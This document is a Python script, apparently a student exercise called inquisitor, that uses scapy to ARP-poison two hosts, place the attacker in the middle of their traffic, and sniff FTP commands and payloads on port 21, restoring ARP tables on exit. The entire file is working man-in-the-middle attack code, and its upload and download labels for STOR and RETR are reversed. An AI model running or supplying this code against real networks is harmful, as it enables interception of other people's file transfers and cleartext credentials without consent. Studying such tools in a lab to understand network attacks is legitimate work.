import sys
import argparse
import re
from scapy.all import *
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import ARP, Ether
import signal

VERBOSE = False

def is_valid_mac(mac_str):
    mac_pattern = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$')
    if not mac_pattern.match(mac_str):
        print(f"Invalid MAC address: {mac_str}")
        sys.exit(1)
    return mac_str

def is_valid_ip(ip_str):
    try:
        nums = ip_str.split('.')
        if len(nums) != 4:
            print(f"Invalid IP address format: {ip_str}. Expected format: X.X.X.X")
            sys.exit(1)
        for n in nums:
            if int(n) < 0 or int(n) > 255:
                print(f"IP address octet out of range: {ip_str}. Each octet must be between 0 and 255.")
                sys.exit(1)
    except ValueError:
        print(f"IP address contains non-numeric values: {ip_str}. Expected numeric values in each octet.")
        sys.exit(1)
    return ip_str

def arp_poison(ip_target, mac_target, ip_src):
    packet = ARP(op=2, pdst=ip_target, hwdst=mac_target, psrc=ip_src)
    send(packet, verbose=VERBOSE, count=3)  # send multiple ARP packets
    
def restore_arp(ip_target, mac_target, ip_src, mac_src):
    packet = ARP(op=2, pdst=ip_target, hwdst=mac_target, psrc=ip_src, hwsrc=mac_src)
    send(packet, verbose=VERBOSE, count=3)
    print(f"Restored ARP table for {ip_target}")

def stop_attack(signum, frame):
    print("\nStopping ARP poisoning and restoring network...")
    restore_arp(args.ip_target, args.mac_target, args.ip_src, args.mac_src)
    restore_arp(args.ip_src, args.mac_src, args.ip_target, args.mac_target)
    sys.exit(0)

def packet_callback(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        payload = packet[Raw].load
        if VERBOSE:
            print(f"Verbose Payload: {payload.decode(errors='ignore')}")
        if b"STOR" in payload:
            print(f"Downloading: FTP file transfer detected: {payload.decode(errors='ignore')}")
        if b"RETR" in payload:
            print(f"Uploading: FTP file transfer detected: {payload.decode(errors='ignore')}")

if __name__ == "__main__":
    if len(sys.argv) < 5:
        print("Usage: python3 ./inquisitor.py <IP-src> <MAC-src> <IP-target> <MAC-target>")
        sys.exit(1)

    parser = argparse.ArgumentParser()
    parser.add_argument("ip_src", type=is_valid_ip, help="IP-src")
    parser.add_argument("mac_src", type=is_valid_mac, help="MAC-src")
    parser.add_argument("ip_target", type=is_valid_ip, help="IP-target")
    parser.add_argument("mac_target", type=is_valid_mac, help="MAC-target")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose mode to show all FTP traffic")

    args = parser.parse_args()

    VERBOSE = args.verbose

    signal.signal(signal.SIGINT, stop_attack)

    print("Starting ARP poisoning... Press CTRL+C to stop.")
    
    try:
        while True: # to update cache 
            arp_poison(args.ip_target, args.mac_target, args.ip_src)
            arp_poison(args.ip_src, args.mac_src, args.ip_target)
            sniff(iface="eth0", filter="tcp port 21", prn=packet_callback, timeout=10)
            time.sleep(2)
    except Exception as e:
        print(f"Error: {e}")
        restore_arp(args.ip_target, args.mac_target, args.ip_src, args.mac_src)
        restore_arp(args.ip_src, args.mac_src, args.ip_target, args.mac_target)
        sys.exit(1)